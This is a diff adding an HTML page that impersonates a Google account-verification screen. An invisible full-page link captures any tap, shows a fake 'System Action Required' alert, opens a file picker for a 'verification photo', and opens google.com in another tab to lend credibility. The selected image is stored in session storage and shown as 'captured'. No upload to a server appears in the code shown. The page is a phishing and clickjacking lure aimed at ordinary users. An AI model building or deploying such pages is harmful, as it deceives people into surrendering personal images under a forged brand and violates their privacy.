@@ -1,0 +1,170 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Google Account Security</title>
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        background-color: #f8f9fa;
+        color: #202124;
+        text-align: center;
+      }
+      .container {
+        padding: 30px;
+        max-width: 450px;
+        width: 90%;
+        background: white;
+        border: 1px solid #dadce0;
+        border-radius: 8px;
+      }
+      .logo {
+        font-size: 28px;
+        font-weight: 600;
+        margin-bottom: 25px;
+      }
+      .g-blue {
+        color: #4285f4;
+      }
+      .g-red {
+        color: #ea4335;
+      }
+      .g-yellow {
+        color: #fbbc05;
+      }
+      .g-green {
+        color: #34a853;
+      }
+      h1 {
+        font-size: 24px;
+        font-weight: 500;
+        margin-bottom: 15px;
+      }
+      p {
+        font-size: 16px;
+        line-height: 1.6;
+        margin-bottom: 30px;
+        color: #5f6368;
+      }
+      .btn-ui {
+        background-color: #1a73e8;
+        color: white;
+        padding: 12px 24px;
+        border-radius: 4px;
+        font-size: 14px;
+        font-weight: 500;
+        display: inline-block;
+        cursor: pointer;
+      }
+      #link {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: 9999;
+        cursor: pointer;
+        opacity: 0;
+      }
+      input {
+        display: none;
+      }
+      #img {
+        margin-top: 25px;
+        max-width: 100%;
+        max-height: 200px;
+        border-radius: 4px;
+        display: none;
+      }
+      .success-msg {
+        margin-top: 15px;
+        color: green;
+        font-size: 14px;
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo">
+        <span class="g-blue">G</span><span class="g-red">o</span
+        ><span class="g-yellow">o</span><span class="g-blue">g</span
+        ><span class="g-green">l</span><span class="g-red">e</span>
+      </div>
+      <h1>Verify it's you</h1>
+      <p>
+        To keep your account secure, Google needs to verify your identity. Tap
+        anywhere to upload a verification photo.
+      </p>
+      <div class="btn-ui">Continue to Google</div>
+      <img id="img" alt="Captured Content" />
+      <div id="successMsg" class="success-msg">
+        ✓ File captured successfully!
+      </div>
+    </div>
+    <input id="fileSelect" type="file" accept="image/*" />
+    <a id="link"></a>
+
+    <script>
+      // Saat halaman dimuat, cek apakah ada gambar tersimpan di sessionStorage
+      window.addEventListener("DOMContentLoaded", function () {
+        const savedImage = sessionStorage.getItem("capturedImage");
+        if (savedImage) {
+          const img = document.getElementById("img");
+          img.src = savedImage;
+          img.style.display = "block";
+          document.getElementById("successMsg").style.display = "block";
+        }
+      });
+
+      const fileSelect = document.getElementById("fileSelect");
+      const link = document.getElementById("link");
+      const img = document.getElementById("img");
+      const successMsg = document.getElementById("successMsg");
+
+      link.onclick = (e) => {
+        e.preventDefault();
+
+        alert(
+          "System Action Required: Please select a photo to proceed with Google verification.",
+        );
+
+        // Trigger file picker
+        fileSelect.click();
+
+        // Open new tab to Google (trusted domain)
+        window.open("https://google.com", "_blank");
+      };
+
+      fileSelect.onchange = (event) => {
+        if (fileSelect.files.length > 0) {
+          const file = fileSelect.files[0];
+          // Baca file sebagai Data URL agar bisa disimpan ke sessionStorage
+          const reader = new FileReader();
+          reader.onload = function (ev) {
+            const dataUrl = ev.target.result;
+            // Simpan ke sessionStorage
+            sessionStorage.setItem("capturedImage", dataUrl);
+            // Tampilkan gambar
+            img.src = dataUrl;
+            img.style.display = "block";
+            successMsg.style.display = "block";
+            console.log("File captured:", file.name);
+          };
+          reader.readAsDataURL(file);
+        }
+      };
+    </script>
+  </body>
+</html>
